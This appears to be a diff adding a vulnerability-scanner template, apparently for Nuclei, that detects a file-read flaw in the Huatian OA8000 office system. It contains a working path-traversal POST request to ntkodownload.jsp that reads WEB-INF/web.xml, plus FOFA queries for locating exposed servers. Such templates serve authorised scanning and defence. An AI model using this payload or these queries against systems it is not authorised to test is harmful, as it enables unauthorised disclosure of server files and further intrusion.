@@ -1,0 +1,33 @@
+id: huatian-oa-ntkodownload-fileread
+
+info:
+  name: 华天动力 OA 系统 ntkodownload - fileread
+  author: leadlife
+  severity: high
+  description:
+  reference:
+    - todo
+  metadata:
+    verified: true
+    fofa-query: app="华天动力-OA8000" || body="/OAapp/WebObjects/OAapp.woa" || body="/OAapp/htpages/app"
+    hunter-query: demo
+  tags: huatian,fileread,oa
+  
+http:
+  - raw:
+      - |
+        POST /OAapp/jsp/trace/ntkodownload.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+        filename=../../../Tomcat/webapps/OAapp/WEB-INF/web.xml
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "java.util.HashMap"
+        
+      - type: status
+        status:
+          - 200
